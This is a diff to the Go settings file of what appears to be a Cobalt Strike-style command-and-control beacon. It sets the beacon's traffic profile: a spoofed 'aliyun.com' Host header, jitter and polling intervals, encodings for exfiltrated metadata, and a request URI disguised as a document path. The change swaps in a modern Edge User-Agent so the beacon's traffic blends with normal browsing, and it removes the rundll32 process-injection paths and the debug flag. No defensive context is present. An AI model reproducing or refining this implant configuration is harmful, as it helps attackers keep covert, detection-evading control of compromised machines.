@@ -20,12 +20,11 @@ var (
 	VerifySSLCert               = true
 	TimeOut       time.Duration = 10 //seconds
 
-	IV                 = []byte("abcdefghijklmnop")
-	GlobalKey          []byte
-	AesKey             []byte
-	HmacKey            []byte
-	Counter            = 0
-	ComputerNameLength = 0
+	IV        = []byte("abcdefghijklmnop")
+	GlobalKey []byte
+	AesKey    []byte
+	HmacKey   []byte
+	Counter   = 0
 )
 
 // personalized settings
@@ -50,19 +49,19 @@ var (
 
 // C2profile settings
 var (
+	HttpHeaders = req.Header{
+		"Host":         "aliyun.com",
+		"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.78",
+		"Server":       "nginx",
+		"Accept":       "*/*",
+		"Content-Type": "text/html;charset=UTF-8",
+	}
+
 	WaitTime = 3000 * time.Millisecond
 
 	Jitter = 7
 	// % Jitter
 	//0 <= Jitter <= 100
-
-	HttpHeaders = req.Header{
-		"Host":         "aliyun.com",
-		"User-Agent":   "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUS)",
-		"Server":       "nginx",
-		"Accept":       "*/*",
-		"Content-Type": "text/html;charset=UTF-8",
-	}
 
 	Http_get_uri            = "/www/handle/doc"
 	Http_get_metadata_crypt = []string{"base64url"}
@@ -89,11 +88,4 @@ var (
 	Http_post_server_output_crypt      = []string{"mask", "netbios"}
 	Http_post_server_output_prepend    = "data="
 	Http_post_server_output_append     = "%%"
-
-	Spawnto_x86 = "c:\\windows\\syswow64\\rundll32.exe"
-	Spawnto_x64 = "c:\\windows\\system32\\rundll32.exe"
-)
-
-const (
-	DebugMode = true
 )
